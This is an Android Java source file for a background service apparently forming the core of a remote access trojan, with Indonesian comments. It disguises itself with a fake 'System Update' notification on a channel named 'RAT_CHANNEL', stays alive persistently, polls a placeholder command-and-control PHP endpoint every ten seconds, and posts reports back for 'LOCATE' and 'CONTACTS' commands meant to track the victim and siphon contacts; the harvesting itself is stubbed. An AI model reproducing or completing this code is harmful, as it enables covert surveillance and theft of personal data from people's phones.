package com.tufanakcay.androidwebview;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import org.json.JSONObject;

public class RemoteControlService extends Service {

    private Handler handler = new Handler();
    private String apiUrl = "https://websitemu.com/api.php"; // GANTI DENGAN URL PHP KAMU
    private int pollingInterval = 10000; // Cek perintah setiap 10 detik

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        // Menampilkan notifikasi agar sistem tidak membunuh servis ini
        Notification notification = new NotificationCompat.Builder(this, "RAT_CHANNEL")
                .setContentTitle("System Update")
                .setContentText("Checking for updates...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .build();

        startForeground(1, notification);
        startPolling();
        
        return START_STICKY;
    }

    private void startPolling() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                new Thread(() -> checkCommand()).start();
                handler.postDelayed(this, pollingInterval);
            }
        }, pollingInterval);
    }

    private void checkCommand() {
        try {
            // Android melakukan GET ke api.php untuk ambil perintah
            URL url = new URL(apiUrl + "?action=get_command&device_id=target_01");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            Scanner s = new Scanner(conn.getInputStream()).useDelimiter("\\A");
            String response = s.hasNext() ? s.next() : "";
            
            JSONObject json = new JSONObject(response);
            if (json.has("cmd")) {
                String command = json.getString("cmd");
                executeCommand(command);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void executeCommand(String cmd) {
        if (cmd.equals("LOCATE")) {
            // Panggil fungsi GPS dan kirim ke PHP
            sendDataToServer("LOG", "Lokasi berhasil dilacak: -6.2, 106.8");
        } else if (cmd.equals("CONTACTS")) {
            // Ambil kontak dan kirim
            sendDataToServer("LOG", "Data kontak telah disedot.");
        }
    }

    private void sendDataToServer(String type, String message) {
        try {
            URL url = new URL(apiUrl + "?action=report");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);

            JSONObject data = new JSONObject();
            data.put("time", System.currentTimeMillis());
            data.put("msg", message);

            OutputStream os = conn.getOutputStream();
            os.write(data.toString().getBytes());
            os.flush();
            conn.getResponseCode();
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "RAT_CHANNEL", "System Background",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
